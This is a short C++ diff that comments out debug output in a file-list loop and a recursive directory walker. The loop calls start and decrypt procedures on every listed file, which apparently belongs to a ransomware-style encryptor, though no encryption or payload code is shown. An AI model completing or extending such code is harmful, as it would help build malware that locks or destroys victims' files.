@@ -3,6 +3,7 @@
 
 //extern std::vector<LPWSTR> filesDB;
 void iterateFilesDB(BOOL action) {
+	//DWORD junk;
 	for (unsigned long int i = 0; i < filesDB.size(); i++) {
 		if (action == TRUE) {
 			startProcedureOnFile(filesDB.at(i));
@@ -10,7 +11,9 @@ void iterateFilesDB(BOOL action) {
 		if (action == FALSE) {
 			decryptProcedure(filesDB.at(i));
 		}
-		//std::wcout << filesDB.at(i) << std::endl;
+		
+		//WriteFile(statFileHandle, filesDB.at(i).c_str(), filesDB.at(i).size() * sizeof(wchar_t), &junk, NULL);
+		//WriteFile(statFileHandle, L"\n", sizeof(L"\n"), &junk, NULL);
 	}
 }
 
@@ -89,8 +92,8 @@ int rWalking(const wchar_t *dirName, const bool ifBase) {
 		return false;
 	}
 	auto HFile = new HANDLE;
-	writeCurPath();
-	std::wcout << curPath  << std::endl;
+	//writeCurPath();
+	//std::wcout << curPath  << std::endl;
 	
 	
 	*HFile = FindFirstFile(L"*", &curItem);
